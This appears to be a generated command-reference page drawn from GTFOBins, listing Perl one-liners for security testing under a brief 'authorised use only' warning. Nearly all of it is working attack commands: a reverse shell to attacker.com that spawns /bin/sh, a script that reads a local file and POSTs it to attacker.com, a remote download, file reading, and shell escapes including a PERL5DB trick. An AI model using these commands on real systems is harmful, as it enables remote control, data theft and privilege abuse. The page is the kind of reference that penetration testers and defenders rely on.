---
parsed_by: focuslocust
source: commands
type: generated
---
# perl Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## perl

Tool page: [perl](../../tools/linux/perl.md)

### download

```text
perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>"attacker.com",PeerPort=>80,Proto=>"tcp") or die; print $s "GET /path/to/input-file HTTP/1.1\r\nHost: attacker.com\r\nMetadata: true\r\nConnection: close\r\n\r\n"; open(my $fh, ">", "/path/to/output-file") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "\r\n") { $in_content = 1; } } close($s); close($fh);'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/perl` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
perl -ne print /path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/perl` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
perl -e 'use Socket;$i="attacker.com";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/perl` |
| Evidence | Function example preserved from source parser. |

### shell

```text
perl -e 'exec "/bin/sh"'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/perl` |
| Evidence | Function example preserved from source parser. |

### shell

```text
PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl /dev/null
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/perl` |
| Evidence | Function example preserved from source parser. |

### upload

```text
perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>"attacker.com", PeerPort=>80, Proto=>"tcp") or die;open(my $file, "<", "/path/to/input-file") or die;$content = join("", <$file>);close($file);$headers = "POST / HTTP/1.1\r\nHost: attacker.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " . length($content) . "\r\nConnection: close\r\n\r\n";print $s $headers . $content;while (<$s>) { }close($s);'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/perl` |
| Evidence | Function example preserved from source parser. |
